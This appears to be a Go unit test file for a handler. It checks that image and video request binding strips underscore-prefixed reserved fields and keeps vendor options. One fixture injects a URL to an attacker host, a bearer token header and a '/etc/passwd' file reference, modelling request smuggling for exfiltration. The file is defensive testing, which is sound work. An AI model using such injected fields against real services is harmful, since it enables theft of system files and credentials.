package handler

import "testing"

func TestBindImageRequestFiltersWorkerReservedFields(t *testing.T) {
	req, err := bindImageRequest([]byte(`{
		"model":"image-model",
		"prompt":"draw",
		"_url":"https://attacker.example/steal",
		"_headers":{"Authorization":"Bearer leaked"},
		"_files":{"image":"/etc/passwd"},
		"vendor_option":"kept"
	}`))
	if err != nil {
		t.Fatalf("bindImageRequest returned error: %v", err)
	}
	m := req.ToMap()
	for _, key := range []string{"_url", "_headers", "_files"} {
		if _, ok := m[key]; ok {
			t.Fatalf("reserved field %q was not filtered: %#v", key, m[key])
		}
	}
	if m["vendor_option"] != "kept" {
		t.Fatalf("non-reserved extra field was not preserved: %#v", m["vendor_option"])
	}
}

func TestBindVideoRequestFiltersFutureUnderscoreFields(t *testing.T) {
	req, err := bindVideoRequest([]byte(`{
		"model":"video-model",
		"prompt":"move",
		"_future_control":"blocked",
		"vendor_option":"kept"
	}`))
	if err != nil {
		t.Fatalf("bindVideoRequest returned error: %v", err)
	}
	m := req.ToMap()
	if _, ok := m["_future_control"]; ok {
		t.Fatalf("future reserved field was not filtered")
	}
	if m["vendor_option"] != "kept" {
		t.Fatalf("non-reserved extra field was not preserved")
	}
}
